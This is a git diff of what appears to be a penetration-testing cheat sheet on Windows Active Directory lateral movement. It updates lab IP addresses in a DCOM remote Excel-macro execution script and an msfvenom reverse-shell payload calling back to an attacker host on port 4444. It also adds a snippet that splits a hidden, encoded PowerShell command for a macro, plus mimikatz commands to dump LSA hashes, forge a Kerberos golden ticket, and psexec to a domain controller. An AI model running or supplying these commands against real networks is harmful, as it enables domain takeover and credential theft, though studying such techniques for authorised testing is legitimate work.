@@ -195,7 +195,7 @@ lsadump::dcsync /user:corp\iis_service
 
 kerberos::hash /password:puttheservicepasswordhere
 
-#### DCOM
+#### DCOM - Need TCP COM port 135 and SMB port 445 
 
 POC Macro
 
@@ -207,11 +207,11 @@ End Sub
 Execute Excel Macro Remotely
 
 ```
-$com = [activator]::CreateInstance([type]::GetTypeFromProgId("Excel.Application", "192.168.1.110"))
+$com = [activator]::CreateInstance([type]::GetTypeFromProgId("Excel.Application", "172.16.175.5"))
 $LocalPath = "C:\Users\jeff_admin.corp\myexcel.xls"
-$RemotePath = "\\192.168.1.110\c$\myexcel.xls" 
+$RemotePath = "\\172.16.175.5\c$\myexcel.xls" 
 [System.IO.File]::Copy($LocalPath, $RemotePath, $True)
-$Path = "\\192.168.1.110\c$\Windows\sysWOW64\config\systemprofile\Desktop" 
+$Path = "\\172.16.175.5\c$\Windows\sysWOW64\config\systemprofile\Desktop" 
 $temp = [system.io.directory]::createDirectory($Path)
 $Workbook = $com.Workbooks.Open("C:\myexcel.xls") 
 $com.Run("mymacro")
@@ -221,9 +221,16 @@ $com.Run("mymacro")
 Generate shell code
 
 ```
-msfvenom -p windows/shell_reverse_tcp LHOST=192.168.1.111 LPORT=4444 -f hta-psh -o evil.hta
+msfvenom -p windows/shell_reverse_tcp LHOST=172.16.175.10 LPORT=4444 -f hta-psh -o evil.hta
 ```
+Split code
 
+```
+str = "powershell.exe -nop -w hidden -e aQBmACgAWwBJAG4AdABQ....."
+n = 50
+for i in range(0, len(str), n):
+print "Str = Str + " + '"' + str[i:i+n] + '"'
+```
 Updated POC Macro
 
 ```
@@ -238,3 +245,23 @@ Shell (Str)
 End Sub
 ```
 
+#### Golden ticket
+
+Dumping password hashes
+```
+mimikatz # privilege::debug
+
+mimikatz # lsadump::lsa /patch
+
+```
+Creating golden ticket
+
+```
+mimikatz # kerberos::purge
+
+mimikatz # kerberos::golden /user:fakeuser /domain:corp.com /sid:S-1-5-21-1602875587- 2787523311-2599479668 /krbtgt:75b60230a2394a812000dbfad8415965 /ptt
+
+mimikatz # misc::cmd - Launching new cmd prompt with golden ticket injected
+
+psexec.exe \\dc01 cmd.exe
+```
